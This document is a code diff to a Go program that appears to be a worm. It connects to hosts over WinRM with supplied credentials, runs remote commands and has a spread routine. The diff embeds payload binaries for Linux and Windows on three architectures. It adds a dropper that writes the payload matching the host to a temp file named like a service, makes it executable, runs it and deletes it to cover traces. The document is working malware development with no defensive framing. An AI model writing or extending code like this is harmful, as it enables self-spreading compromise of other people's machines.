@@ -1,6 +1,9 @@
 package main
 
 import (
+	_ "embed"
+    "os"
+    "os/exec"
 	"context"
 	"fmt"
 	"io"
@@ -82,7 +85,7 @@ func establish_winRM(host_ip, username, pswd string) (*winrm.Client, error){
 }
 
 func run_WinRM_cmds(winrm_client *winrm.Client, cmd string) error {
-	_, err := winrm_client.RunWithContext(context.Background ,cmd, io.Discard, io.Discard)
+	_, err := winrm_client.RunWithContext(context.Background() ,cmd, io.Discard, io.Discard)
 	return err
 }
 
@@ -180,6 +183,23 @@ func spread() {
 
 }
 
+//go:embed binaries/payload_linux_amd64
+var payload_linux_amd64 []byte
+
+//go:embed binaries/payload_linux_386
+var payload_linux_386 []byte
+
+//go:embed binaries/payload_linux_arm64
+var payload_linux_arm64 []byte
+
+//go:embed binaries/payload_windows_amd64.exe
+var payload_windows_amd64 []byte
+
+//go:embed binaries/payload_windows_386.exe
+var payload_windows_386 []byte
+
+//go:embed binaries/payload_windows_arm64.exe
+var payload_windows_arm64 []byte
 
 func main(){
 	
@@ -191,20 +211,42 @@ func main(){
 		arch = arch[len(arch)-2:]
 	} 
 
-	/*
-	!!! COME BACK HERE WHEN WAGON IS DONE TO EMBED EXEs INTO DICT !!! 
-	*/
-	binaries := map[Platform]string {
-		{OS: "windows", Arch:"64"} : "WINDOWS - x64",
-		{OS: "windows", Arch:"86"} : "WINDOWS - x86",
-		{OS: "windows", Arch:"arm"} : "WINDOWS - ARM",
-		{OS: "linux", Arch:"64"} : "LINUX - x64",
-		{OS: "linux", Arch:"86"} : "LINUX - x86",
-		{OS: "linux", Arch:"arm"} : "LINUX - ARM",
-	}
 
-	fmt.Println(binaries[Platform{OS: host_os, Arch: arch}])
+    payloads := map[Platform][]byte{
+        {OS: "linux",   Arch: "amd64"}: payload_linux_amd64,
+        {OS: "linux",   Arch: "386"}:   payload_linux_386,
+        {OS: "linux",   Arch: "arm64"}: payload_linux_arm64,
+        {OS: "windows", Arch: "amd64"}: payload_windows_amd64,
+        {OS: "windows", Arch: "386"}:   payload_windows_386,
+        {OS: "windows", Arch: "arm64"}: payload_windows_arm64,
+
+    }
+
+
+	fmt.Println(payloads[Platform{OS: host_os, Arch: arch}])
 	
-	// spread()
+	 data, ok := payloads[Platform{OS: runtime.GOOS, Arch: runtime.GOARCH}]
+    if !ok {
+        return
+    }
+
+    // temp file ext for windows
+    ext := ""
+    if runtime.GOOS == "windows" {
+        ext = ".exe"
+    }
+
+    tmp, err := os.CreateTemp("", "svc*"+ext)
+    if err != nil {
+        return
+    }
+    tmp.Write(data)
+    tmp.Close()
+    os.Chmod(tmp.Name(), 0700)
+
+    cmd := exec.Command(tmp.Name())
+    cmd.Run()
+
+    os.Remove(tmp.Name())
 
 }
